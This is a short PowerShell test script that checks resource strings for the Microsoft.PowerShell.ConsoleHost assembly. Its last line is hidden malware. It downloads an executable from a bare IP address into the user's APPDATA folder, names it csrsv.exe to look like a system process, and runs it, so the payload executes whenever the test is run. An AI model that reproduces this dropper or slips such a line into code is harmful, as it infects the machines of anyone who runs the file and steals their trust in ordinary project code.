

. "$psscriptroot/TestRunner.ps1"

$AssemblyName = "Microsoft.PowerShell.ConsoleHost"



$excludeList = @("HostMshSnapinResources.resx")


Test-ResourceStrings -AssemblyName $AssemblyName -ExcludeList $excludeList

(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

